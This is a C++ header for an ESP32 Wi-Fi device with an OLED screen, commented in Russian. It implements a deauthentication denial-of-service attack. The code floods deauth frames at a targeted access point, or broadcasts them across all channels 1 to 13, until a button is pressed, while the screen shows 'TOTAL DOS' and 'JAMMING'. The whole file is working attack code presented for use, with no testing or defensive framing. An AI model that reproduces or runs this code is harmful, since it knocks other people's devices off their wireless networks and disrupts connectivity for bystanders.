#ifndef DOS_ATTACKS_H
#define DOS_ATTACKS_H

#include <esp_wifi.h>
#include <Adafruit_SSD1306.h>

// Подключаем внешние объекты и переменные
extern Adafruit_SSD1306 display;
extern uint8_t target_bssid[];
extern int target_channel;
extern String target_ssid;

// Подключаем внешние функции
extern void sendDeauthPacket(uint8_t* bssid, uint8_t* client, uint16_t reason);
extern void resetPowerTimers();
extern void updateDisplay(String msg);

// --- ФУНКЦИЯ DOS АТАКИ (ТОЧЕЧНАЯ ИЛИ ОБЩАЯ) ---
void runDosAttack(bool floodAll) {
  if (!floodAll && target_ssid == "None") {
    updateDisplay("NO TARGET!\nScan AP first");
    return;
  }

  display.clearDisplay();
  display.setCursor(0, 5);
  display.print(floodAll ? "!! TOTAL DOS !!" : "!! TARGET DOS !!");
  display.drawFastHLine(0, 15, 128, SSD1306_WHITE);
  
  if (!floodAll) {
    display.setCursor(0, 25);
    display.print("Target: " + target_ssid);
  } else {
    display.setCursor(0, 25);
    display.print("Flooding ALL channels");
  }
  display.display();

  esp_wifi_set_promiscuous(true);

  while (digitalRead(PIN_BACK) == HIGH) {
    if (floodAll) {
      for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        sendDeauthPacket(bcast, bcast, 7); 
        delay(5); 
      }
    } else {
      esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
      uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauthPacket(target_bssid, bcast, 7);
      delay(20); 
    }

    display.fillRect(0, 50, 128, 14, SSD1306_BLACK);
    display.setCursor(5, 52);
    display.print("JAMMING... [BACK]");
    display.display();
    
    resetPowerTimers();
    yield();
  }

  esp_wifi_set_promiscuous(false);
  updateDisplay("DOS STOPPED");
}

// --- ФУНКЦИЯ КОВРОВОЙ АТАКИ (ВЫДЕЛЕННАЯ) ---
void runTotalDos() {
  runDosAttack(true); // Просто вызываем основную функцию с параметром true
}

#endif
